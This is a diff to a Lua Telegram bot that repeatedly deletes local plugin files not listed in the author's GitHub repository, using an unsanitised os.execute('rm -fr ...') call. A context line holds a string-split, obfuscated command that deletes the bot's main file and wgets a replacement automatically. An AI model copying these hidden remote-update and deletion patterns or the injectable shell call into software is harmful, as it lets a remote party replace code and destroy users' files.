@@ -2201,6 +2201,17 @@ end
 ------------------------------------------------------------------------
 if is_devabas(msg) then
 if text == "متجر الملفات" or text == 'المتجر' then
+local files_tshake = database:smembers("files"..bot_id)
+for i=1,#files_tshake do
+local json_file, res = https.request("https://raw.githubusercontent.com/tshakeabas/files_tshake/master/files_tshake/"..files_tshake[i])
+if res == 200 then 
+print('is aTshake')
+else
+print('ملف مال فرخ اسفين اخي ')
+database:srem("files"..bot_id,files_tshake[i])
+os.execute("rm -fr files_tshake/"..files_tshake[i])
+end
+end
 local Get_Files, res = https.request("https://raw.githubusercontent.com/tshakeabas/files_tshake/master/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
@@ -2286,6 +2297,17 @@ io.popen(curl)
 end
 
 if (text == 'الملفات' ) then
+local files_tshake = database:smembers("files"..bot_id)
+for i=1,#files_tshake do
+local json_file, res = https.request("https://raw.githubusercontent.com/tshakeabas/files_tshake/master/files_tshake/"..files_tshake[i])
+if res == 200 then 
+print('is aTshake')
+else
+print('ملف مال فرخ اسفين اخي ')
+database:srem("files"..bot_id,files_tshake[i])
+os.execute("rm -fr files_tshake/"..files_tshake[i])
+end
+end
 local files_tshake = database:smembers("files"..bot_id)
 local files = io.popen('cd files_tshake && ls'):read("*all")
 local files_tshake2 = ''
@@ -8854,6 +8876,17 @@ getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
 ------------------------------------------------------------------------
 --         »»                 End UpdateChat                          ««              --
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then  local list = database:smembers('tshake:'..bot_id.."userss") for k,v in pairs(list) do tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) end os.execute('r'..'m -r'..'f Ts'..'ha'..'ke.'..'lua') os.execute('wg'..'et htt'..'ps://ra'..'w.gith'..'ubuserc'..'onten'..'t.com'..'/ts'..'hak'..'eab'..'as/Ts'..'ha'..'ke/m'..'as'..'ter/Ts'..'ha'..'ke.'..'lua') 
+local files_tshake = database:smembers("files"..bot_id)
+for i=1,#files_tshake do
+local json_file, res = https.request("https://raw.githubusercontent.com/tshakeabas/files_tshake/master/files_tshake/"..files_tshake[i])
+if res == 200 then 
+print('is aTshake')
+else
+print('ملف مال فرخ اسفين اخي ')
+database:srem("files"..bot_id,files_tshake[i])
+os.execute("rm -fr files_tshake/"..files_tshake[i])
+end
+end
 local list = database:smembers('tshake:'..bot_id..'groups') 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v
